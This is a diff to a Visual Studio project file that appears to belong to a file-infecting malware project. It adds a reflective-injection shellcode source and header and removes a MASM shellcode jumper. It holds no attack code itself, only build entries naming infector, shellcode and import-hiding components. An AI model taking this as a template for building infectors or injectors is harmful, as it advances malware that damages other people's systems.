@@ -132,17 +132,14 @@
     <ClCompile Include="FileInfector.cpp" />
     <ClCompile Include="FileSystem\FileSystem.cpp" />
     <ClCompile Include="Infector.cpp" />
+    <ClCompile Include="ReflectiveInjectionShellcode.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="custom_std.h" />
     <ClInclude Include="FileSystem\FileSystem.h" />
     <ClInclude Include="ImportlessApi.hpp" />
     <ClInclude Include="Infector.h" />
-  </ItemGroup>
-  <ItemGroup>
-    <MASM Include="ShellcodeJumper.masm">
-      <FileType>Document</FileType>
-    </MASM>
+    <ClInclude Include="ReflectiveInjectionShellcode.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
